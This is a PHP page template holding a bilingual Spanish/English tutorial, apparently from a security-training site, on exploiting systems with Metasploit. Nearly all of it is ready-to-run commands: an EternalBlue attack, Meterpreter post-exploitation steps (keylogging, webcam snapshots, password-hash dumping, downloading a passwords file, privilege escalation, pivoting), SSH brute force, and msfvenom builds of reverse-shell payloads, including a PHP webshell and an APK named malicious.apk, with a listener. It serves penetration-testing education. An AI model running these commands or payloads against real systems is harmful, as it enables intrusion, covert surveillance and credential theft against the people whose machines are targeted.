<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'Metasploit Framework: Explotación — CyberEscudo' : 'Metasploit Framework: Exploitation — CyberEscudo';
$contentTitle = $lang==='es' ? 'Metasploit Framework: Explotación' : 'Metasploit Framework: Exploitation';
$contentDate  = '2022-03-10';
$contentTags  = ['Metasploit','Exploitation','Meterpreter','Payload','Post-Explotación'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p><strong>Metasploit Framework</strong> es la plataforma de explotación más utilizada en ciberseguridad ofensiva. Permite desarrollar, probar y ejecutar exploits contra sistemas objetivo en un entorno controlado.</p>

  <h2>1. Iniciar Metasploit</h2>
  <pre><code># Iniciar la base de datos PostgreSQL:
service postgresql start

# Iniciar Metasploit:
msfconsole

# Verificar conexión con la base de datos:
db_status</code></pre>

  <h2>2. Flujo básico de explotación</h2>
  <pre><code># 1. Buscar un exploit:
search ms17-010
search type:exploit platform:windows smb

# 2. Seleccionar el exploit:
use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver opciones requeridas:
show options

# 4. Configurar el objetivo:
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5     # Nuestra IP (para reverse shell)
set LPORT 4444

# 5. Ver payloads compatibles:
show payloads

# 6. Seleccionar payload:
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 7. Ejecutar:
exploit
# o
run</code></pre>

  <h2>3. Meterpreter — Post-explotación</h2>
  <pre><code># Información del sistema:
sysinfo
getuid
getpid

# Subir/bajar archivos:
upload /ruta/local/archivo.exe C:\\Windows\\Temp\\
download C:\\Users\\Admin\\passwords.txt /tmp/

# Captura de pantalla:
screenshot

# Activar cámara:
webcam_snap

# Capturar pulsaciones de teclado:
keyscan_start
keyscan_dump
keyscan_stop

# Obtener hashes de contraseñas:
hashdump

# Shell del sistema:
shell

# Elevar privilegios:
getsystem

# Pivotar a otra máquina de la red:
route add 10.10.10.0/24 [session_id]</code></pre>

  <h2>4. Módulos auxiliares útiles</h2>
  <pre><code># Escaneo de puertos integrado:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# Escaneo SMB:
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Fuerza bruta SSH:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Escaneo de vulnerabilidades web:
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set VHOST www.target.com
run</code></pre>

  <h2>5. Creación de payloads con msfvenom</h2>
  <pre><code># Payload Windows EXE (reverse shell):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f exe -o shell.exe

# Payload Linux ELF:
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f elf -o shell

# Payload PHP (webshell):
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f raw -o shell.php

# Payload Android APK:
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -o malicious.apk</code></pre>

  <h2>6. Listener (multi/handler)</h2>
  <pre><code>use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j   # -j = en segundo plano (job)</code></pre>

  <h2>Gestión de sesiones</h2>
  <pre><code>sessions -l          # Listar sesiones activas
sessions -i 1        # Interactuar con sesión 1
sessions -k 1        # Cerrar sesión 1
background           # Poner sesión en segundo plano</code></pre>
</div>
<?php else: ?>
<div class="prose">
  <p><strong>Metasploit Framework</strong> is the most widely used offensive security platform. It allows you to develop, test and execute exploits against target systems in a controlled environment.</p>

  <h2>1. Starting Metasploit</h2>
  <pre><code>service postgresql start
msfconsole
db_status   # Verify database connection</code></pre>

  <h2>2. Basic Exploitation Flow</h2>
  <pre><code># 1. Search for an exploit:
search ms17-010
search type:exploit platform:windows smb

# 2. Select the exploit:
use exploit/windows/smb/ms17_010_eternalblue

# 3. View required options:
show options

# 4. Configure target:
set RHOSTS 192.168.1.10
set LHOST  192.168.1.5     # Your IP (for reverse shell)
set LPORT  4444

# 5. View compatible payloads:
show payloads

# 6. Select payload:
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 7. Run:
exploit</code></pre>

  <h2>3. Meterpreter — Post-Exploitation</h2>
  <pre><code># System information:
sysinfo | getuid | getpid

# File transfer:
upload /local/file.exe C:\Windows\Temp\
download C:\Users\Admin\passwords.txt /tmp/

# Screen capture:
screenshot

# Keylogging:
keyscan_start
keyscan_dump
keyscan_stop

# Dump Windows password hashes:
hashdump

# Drop to system shell:
shell

# Privilege escalation:
getsystem

# Pivot to another network segment:
route add 10.10.10.0/24 [session_id]</code></pre>

  <h2>4. Useful Auxiliary Modules</h2>
  <pre><code># Built-in port scanner:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# SMB version scanner:
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH brute force:
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run</code></pre>

  <h2>5. Creating Payloads with msfvenom</h2>
  <pre><code># Windows EXE (reverse shell):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f exe -o shell.exe

# Linux ELF:
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f elf -o shell

# PHP webshell:
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -f raw -o shell.php

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -o malicious.apk</code></pre>

  <h2>6. Setting Up a Listener</h2>
  <pre><code">use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j   # -j = run as background job</code></pre>

  <h2>Session Management</h2>
  <pre><code>sessions -l       # List active sessions
sessions -i 1     # Interact with session 1
sessions -k 1     # Kill session 1
background        # Send session to background</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
